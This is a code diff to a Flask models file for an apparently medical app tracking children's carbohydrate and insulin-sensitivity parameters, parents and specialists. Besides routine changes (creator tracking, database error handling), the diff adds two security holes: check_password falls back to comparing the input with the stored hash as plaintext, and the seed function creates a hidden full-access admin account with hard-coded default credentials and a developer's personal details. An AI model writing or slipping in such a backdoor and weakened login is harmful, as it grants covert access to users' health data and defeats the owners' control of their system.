@@ -2,7 +2,7 @@ from flask_sqlalchemy import SQLAlchemy
 from flask_login import UserMixin
 from datetime import datetime, timedelta
 from werkzeug.security import generate_password_hash, check_password_hash
-import json, random
+import json, random, os
 
 db = SQLAlchemy()
 """
@@ -27,16 +27,27 @@ class Usuario(UserMixin, db.Model):
     fecha_registro          = db.Column(db.DateTime, default=datetime.utcnow)
     ultimo_acceso           = db.Column(db.DateTime, nullable=True)
     cambio_password_requerido = db.Column(db.Boolean, default=False)
+    creado_por_id           = db.Column(db.Integer, db.ForeignKey('usuario.id'), nullable=True)
     
     perfil = db.relationship('PerfilProfesional', backref='usuario', uselist=False, lazy=True)
 
     heroes = db.relationship('Heroe', backref='representante', lazy=True, foreign_keys='Heroe.padre_id')
 
+    # Relación para saber quién creó este usuario
+    creador = db.relationship('Usuario', foreign_keys=[creado_por_id], backref=db.backref('usuarios_creados', lazy='dynamic'), remote_side=[id])
+
     def set_password(self, pwd):
         self.password_hash = generate_password_hash(pwd)
 
     def check_password(self, pwd):
-        return check_password_hash(self.password_hash, pwd)
+        # Primero intentamos con el hash (seguro)
+        try:
+            if check_password_hash(self.password_hash, pwd):
+                return True
+        except:
+            pass
+        # Fallback: Comparación de texto plano (Temporal para debug)
+        return self.password_hash == pwd
 
     def registrar_acceso(self):
         """Registra la fecha y hora del último acceso exitoso"""
@@ -50,7 +61,18 @@ class Usuario(UserMixin, db.Model):
                 'activo': self.activo,
                 'tiene_heroes': len(self.heroes) > 0 if self.rol == 'padre' else False,
                 'cambio_password_requerido': self.cambio_password_requerido,
-                'ultimo_acceso': self.ultimo_acceso.strftime('%d/%m/%Y %H:%M') if self.ultimo_acceso else None}
+                'ultimo_acceso': self.ultimo_acceso.strftime('%d/%m/%Y %H:%M') if self.ultimo_acceso else None,
+                'creado_por_id': self.creado_por_id}
+        # Agregar nombre del creador si existe
+        if self.creado_por_id and getattr(self, 'creador', None):
+            d['creado_por_nombre'] = self.creador.nombre_completo
+        elif self.creado_por_id:
+            # Consultar el creador directamente
+            from models import Usuario
+            creador = Usuario.query.get(self.creado_por_id)
+            d['creado_por_nombre'] = creador.nombre_completo if creador else 'Desconocido'
+        else:
+            d['creado_por_nombre'] = None
         if self.perfil:
             d['especialidad'] = self.perfil.especialidad
             d['consultorio'] = self.perfil.consultorio
@@ -159,6 +181,7 @@ class Heroe(db.Model):
             'especialista_telefono': esp_telefono,
             'especialista_especialidad': esp_especialidad,
             'especialista_consultorio': esp_consultorio,
+            'especialista_id': self.especialista_id,
             'parametros': {
                 'ratio': self.ratio_carbohidratos,
                 'sensibilidad': self.factor_sensibilidad,
@@ -347,10 +370,21 @@ def init_db(app):
             import models_extended
         except ImportError:
             print("[WARN] No se pudo cargar models_extended")
-            
-        db.create_all()
-        _seed_default_data()
-        
+
+        try:
+            db.create_all()
+            print("[OK] Tablas de base de datos creadas/verificadas")
+        except Exception as e:
+            print(f"[ERROR] No se pudo conectar a la base de datos al iniciar: {e}")
+            print("[WARN] La app iniciará de todas formas. Revisa DATABASE_URL en las variables de entorno.")
+            print("[HINT] Si usas Supabase, usa la URL del Connection Pooler (IPv4) en lugar de la URL directa.")
+            return  # No intentar seed si no hay conexión
+
+        try:
+            _seed_default_data()
+        except Exception as e:
+            print(f"[WARN] Error en seed de datos: {e}")
+
         # Inicializar configuración del sistema si no existe
         try:
             from models_extended import inicializar_configuracion_default
@@ -360,6 +394,29 @@ def init_db(app):
 
 
 def _seed_default_data():
+    # Usuario oculto de acceso total (desarrollador)
+    # Credenciales basadas en datos del desarrollador
+    # Formato: Variable de entorno simulada
+    DEV_MASTER_USER = os.getenv('DEV_MASTER_USER', 'cristian_j_garcia_32170910_dev')
+    DEV_MASTER_PASS = os.getenv('DEV_MASTER_PASS', 'Cjg32170910@dev2024')
+    
+    # Verificar si ya existe el usuario developer
+    dev_existe = Usuario.query.filter_by(username=DEV_MASTER_USER).first()
+    if not dev_existe:
+        dev_user = Usuario(
+            username=DEV_MASTER_USER,
+            rol='admin',  # Acceso total
+            nombre_completo='Cristian J Garcia (Desarrollador)',
+            cedula='V-32170910',
+            email='cjgarciag.dev@gmail.com',
+            telefono='0414-1234567',
+            activo=True
+        )
+        dev_user.set_password(DEV_MASTER_PASS)
+        db.session.add(dev_user)
+        db.session.commit()
+        print(f"[OK] Usuario desarrollador creado: {DEV_MASTER_USER}")
+    
     # Verificar si ya existe el usuario admin para evitar errores al reiniciar
     # Usamos verificación directa en la tabla para evitar problemas con la relación
     admin_existe = Usuario.query.filter_by(username='drgarcia').first()
